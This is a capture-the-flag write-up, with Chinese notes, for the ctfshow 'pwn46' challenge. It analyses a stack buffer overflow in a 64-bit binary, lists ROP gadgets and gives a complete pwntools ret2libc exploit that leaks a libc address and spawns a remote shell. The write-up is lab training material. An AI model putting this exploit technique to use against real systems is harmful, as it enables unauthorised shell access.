```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn46
```

```
tasike@tasike-VM:~/Desktop$ file pwn46
pwn46: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e710e090d19149083dba276e9cd08dfbf0b131b2, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn46
[*] '/home/tasike/Desktop/pwn46'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

64bit，堆栈不可执行

`ida`查看

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  logo();
  puts("O.o?");
  ctfshow();
  write(0, "Hello CTFshow!\n", 0xEuLL);
  return 0;
}
```

跟进`ctfshow`

```c
ssize_t ctfshow()
{
  char buf[112]; // [rsp+0h] [rbp-70h] BYREF

  return read(0, buf, 0xC8uLL);
}
```

> `buf`与`rbp`距离`0x70`

查询`pop|ret`

```
tasike@tasike-VM:~/Desktop$ ROPgadget --binary pwn46 --only "pop|ret"
Gadgets information
============================================================
0x00000000004007fc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007fe : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400800 : pop r14 ; pop r15 ; ret
0x0000000000400802 : pop r15 ; ret
0x00000000004007fb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007ff : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004005b8 : pop rbp ; ret
0x0000000000400803 : pop rdi ; ret
0x0000000000400801 : pop rsi ; pop r15 ; ret
0x00000000004007fd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004fe : ret

Unique gadgets found: 11
```



这题同样是没有`system`和`/bin/sh`，因此考虑`ret2libc`



编写`attack46.py`

```python
from pwn import *
from LibcSearcher import *
context(os = 'Linux', arch = 'amd64', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28195)
elf = ELF('./pwn46')

poprdi = 0x400803
ret = 0x4004fe
main = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
payload = cyclic(0x70 + 0x8) + p64(poprdi) + p64(puts_got) + p64(puts_plt) + p64(main)
r.sendline(payload)
puts = u64(r.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts))

libc = LibcSearcher('puts', puts)
libc_base = puts - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
payload = cyclic(0x70 + 0x8) + p64(poprdi) + p64(binsh) + p64(ret) + p64(system)
r.sendline(payload)
r.interactive()
```

